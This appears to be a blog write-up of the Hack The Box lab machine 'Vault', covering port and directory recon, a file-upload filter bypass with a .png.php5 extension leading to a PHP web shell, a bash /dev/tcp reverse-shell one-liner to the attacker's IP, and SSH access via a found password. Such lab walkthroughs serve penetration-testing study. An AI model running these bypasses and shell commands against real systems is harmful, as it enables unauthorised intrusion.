---
author: Charlie T
title: Vault
date: 2024-03-17
description: --
math: false
tags:
  - OSWE
---
IP: 10.10.10.109

## Recon

Ports Open:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Full Nmap Scan:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80:

- This is page we see when visiting: `http://10.10.10.109/`, where we see a domain name being disclosed

![landing page](homepage.png)

- I tried to do three things:
	- Resolving sparklays.com to the box's IP, however nothing changed
	- Resolving vault.htb domain to box's IP, then trying to add sparklays as a subdomain, but nothing changed
	- tried sparklays as a directory and we get a 403 forbidden:

![forbidden sparklays](vault_sparklays.png)

- Using gobuster, we discover three directories

```
/sparklays/login.php
/sparklays/admin.php
/sparklays/design
```

- The login.php page just gives us **access denied** and nothing more
- The admin.php page seems like a rabbit hole as the way the application pushes the auth request is with the GET method
- The **design** page, however, gives us another 403 forbidden but redirects to **/sparklays/design/**, meaning we can use gobuster once more to dirbust more directories
- Here are the new findings with gobuster:

```
/sparklays/design/uploads
/sparklays/design/design.html
```

- The uploads directory gives us a 403 forbidden
- the design.html page gives us a **Change Logo** option that brings us to an upload function within `changelog.php`

![upload function](vault_upload.png)

- I went one step ahead and considered magic bytes immediately, so that the application recognizes the uploaded file as a png
- I first tested with the normal **.png** extension, and it uploaded just fine

![basic testing](vault_basictest.png)

- When testing a **.php** extension, it prompts: "sorry that file type is not allowed" and unfortunately the magicbytes did not bypass the filters

![testing php ext](vault_basictest2.png)

- We then tried basic types of bypasses such as:

```
web.png.php
web.png.php5 # worked
```

- Using the second option prompted us with a successful upload, so we visit the file within the uploads directory and use the `cmd` parameter to execute arbitrary commands:

```
http://vault.htb/sparklays/design/uploads/web.png.php5?cmd=id
```

![successful bypass](vault_rce.png)

- With this we can get a reverse shell using: `bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'` and url encoding using Burp's decoder tool
- We are now able to get a reverse shell on the box:

![rev shell](vault_rev.png)

## Privilege Escalation

- After manual enumeration, we were able to identify a password within a file named **ssh**
- Using this password, we were able to ssh with the user **dave**

![getting dave](vault_dave.png)











"![Landscape](1.jpg)

---
# References
